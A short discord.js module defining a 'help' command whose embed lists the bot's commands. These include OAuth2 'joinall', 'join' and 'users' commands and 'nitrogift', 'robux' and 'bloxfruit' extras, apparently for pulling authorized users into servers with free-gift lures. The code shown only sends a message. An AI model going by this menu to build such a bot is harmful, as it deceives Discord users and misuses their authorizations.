const discord = require("discord.js");

module.exports = {
  name: "help",
  description: "shows bot commands.",
  default_permission: false,
  timeout: 30000,
  
  run: async (client, interaction, args) => {
    const embed = new discord.EmbedBuilder()
    .setTitle(` `)
.setDescription(`>  **oAuth2 Menu**\n\`clean, refresh, joinall, join, users, leave, wl [add/remove/list]\`\n\n>  **Extra Cmds Menu**\n\`nitroboost, nitroclassic, giveaway, links, nitrogift, nsfw, ping, robux, bloxfruit, backup\`\n\n**Default Prefix:** \`/\`\n**After there authorized it brings them to the verified discord page!**`)
    .setColor(`#2F3136`)
      .setFooter({ text: ` `})
    await interaction.reply({embeds: [embed]})
  }
}